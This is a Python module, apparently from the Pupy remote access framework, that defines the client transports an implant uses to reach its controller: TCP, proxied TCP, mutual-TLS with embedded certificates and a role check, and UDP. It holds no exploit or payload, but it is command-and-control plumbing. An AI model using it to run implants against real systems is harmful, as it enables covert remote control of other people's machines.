# -*- coding: utf-8 -*-

import socket
import ssl
import tempfile
import os

from . import socks

class PupyClient(object):
    def connect(self, host, port, timeout=4):
        """ return a socket after connection """
        raise NotImplementedError("connect not implemented")

class PupyAsyncClient(object):
    def connect(self, host, port, timeout=10):
        self.host=host
        self.port=port
        self.timeout=timeout
        return self.host, self.port, self.timeout

class PupyTCPClient(PupyClient):
    def __init__(self, family = socket.AF_UNSPEC, socktype = socket.SOCK_STREAM, timeout = 4, nodelay = False, keepalive = True):
        super(PupyTCPClient, self).__init__()
        self.sock=None

        self.family=family
        self.socktype=socktype
        self.timeout=timeout
        self.nodelay=nodelay
        self.keepalive=keepalive

    def connect(self, host, port):
        family, socktype, proto, _, sockaddr = socket.getaddrinfo(host, port, self.family, self.socktype)[0]
        s = socket.socket(family, socktype, proto)
        s.settimeout(self.timeout)
        s.connect(sockaddr)
        if self.nodelay:
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        if self.keepalive:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            # Linux specific: after 1 idle minutes, start sending keepalives every 5 minutes.
            # Drop connection after 10 failed keepalives
        if hasattr(socket, "TCP_KEEPIDLE") and hasattr(socket, "TCP_KEEPINTVL") and hasattr(socket, "TCP_KEEPCNT"):
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 1 * 60)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 5 * 60)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 10)
        self.sock=s
        return s

class PupyProxifiedTCPClient(PupyTCPClient):
    def __init__(self, *args, **kwargs):
        self.proxy_addr=kwargs.pop('proxy_addr', None)
        if not self.proxy_addr:
            raise AssertionError("proxy_addr argument is mandatory")
        self.proxy_port=kwargs.pop('proxy_port', None)
        if not self.proxy_port:
            raise AssertionError("proxy_port argument is mandatory")
        self.proxy_port=int(self.proxy_port)
        self.proxy_type=kwargs.pop('proxy_type', "HTTP").upper()
        if self.proxy_type not in socks.PROXY_TYPES:
            raise AssertionError("Unknown proxy type %s"%self.proxy_type)
        self.proxy_username=kwargs.pop('proxy_username', None)
        self.proxy_password=kwargs.pop('proxy_password', None)
        super(PupyProxifiedTCPClient, self).__init__(*args, **kwargs)

    def connect(self, host, port):
        s = socks.socksocket()
        s.setproxy(proxy_type=socks.PROXY_TYPES[self.proxy_type], addr=self.proxy_addr, port=self.proxy_port, rdns=True, username=self.proxy_username, password=self.proxy_password)
        s.settimeout(self.timeout)
        s.connect((host,port))
        if self.nodelay:
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        if self.keepalive:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            # Linux specific: after 10 idle minutes, start sending keepalives every 5 minutes.
            # Drop connection after 10 failed keepalives
        if hasattr(socket, "TCP_KEEPIDLE") and hasattr(socket, "TCP_KEEPINTVL") and hasattr(socket, "TCP_KEEPCNT"):
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 10 * 60)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 5 * 60)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 10)
        self.sock=s
        return s

class PupySSLClient(PupyTCPClient):
    def __init__(self, *args, **kwargs):
        try:
            import pupy_credentials

            self.SSL_CLIENT_CERT = pupy_credentials.SSL_CLIENT_CERT
            self.SSL_CLIENT_KEY = pupy_credentials.SSL_CLIENT_KEY
            self.SSL_CA_CERT = pupy_credentials.SSL_CA_CERT
            self.ROLE = 'CLIENT'

        except:
            from pupylib.PupyCredentials import Credentials

            credentials = Credentials()
            self.SSL_CLIENT_CERT = credentials['SSL_CLIENT_CERT']
            self.SSL_CLIENT_KEY = credentials['SSL_CLIENT_KEY']
            self.SSL_CA_CERT = credentials['SSL_CA_CERT']
            self.ROLE = credentials.role

        self.ciphers = 'SHA256+AES256:SHA1+AES256:@STRENGTH'
        self.cert_reqs = ssl.CERT_REQUIRED
        self.ssl_version = ssl.PROTOCOL_TLSv1

        super(PupySSLClient, self).__init__(*args, **kwargs)

    def connect(self, host, port):
        socket = super(PupySSLClient, self).connect(host, port)

        fd_cert_path, tmp_cert_path = tempfile.mkstemp()
        fd_key_path, tmp_key_path = tempfile.mkstemp()
        fd_ca_path, tmp_ca_path = tempfile.mkstemp()

        os.write(fd_cert_path, self.SSL_CLIENT_CERT)
        os.close(fd_cert_path)
        os.write(fd_key_path, self.SSL_CLIENT_KEY)
        os.close(fd_key_path)
        os.write(fd_ca_path, self.SSL_CA_CERT)
        os.close(fd_ca_path)

        exception = None

        try:
            wrapped_socket = ssl.wrap_socket(
                socket,
                keyfile=tmp_key_path,
                certfile=tmp_cert_path,
                ca_certs=tmp_ca_path,
                server_side=False,
                cert_reqs=self.cert_reqs,
                ssl_version=self.ssl_version,
                ciphers=self.ciphers
            )
        except Exception as e:
            exception = e

        finally:
            os.unlink(tmp_cert_path)
            os.unlink(tmp_key_path)
            os.unlink(tmp_ca_path)

        if exception:
            raise e

        peer = wrapped_socket.getpeercert()

        peer_role = ''

        for (item) in peer['subject']:
            if item[0][0] == 'organizationalUnitName':
                peer_role = item[0][1]

        if not ( self.ROLE == 'CLIENT' and peer_role == 'CONTROL' or \
          self.ROLE == 'CONTROL' and peer_role == 'CLIENT' ):
          raise ValueError('Invalid peer role: {}'.format(peer_role))

        return wrapped_socket

class PupyProxifiedSSLClient(PupySSLClient, PupyProxifiedTCPClient):
    pass

class PupyUDPClient(PupyClient):
    def __init__(self, family = socket.AF_UNSPEC, socktype = socket.SOCK_DGRAM, timeout=3):
        self.sock=None
        super(PupyUDPClient, self).__init__()
        self.family=family
        self.socktype=socktype
        self.timeout=timeout

    def connect(self, host, port):
        self.host=host
        self.port=port
        family, socktype, proto, _, sockaddr = socket.getaddrinfo(host, port, self.family, self.socktype)[0]
        s = socket.socket(family, socktype, proto)
        s.settimeout(self.timeout)
        s.connect(sockaddr)
        self.sock=s
        return s, (host, port)
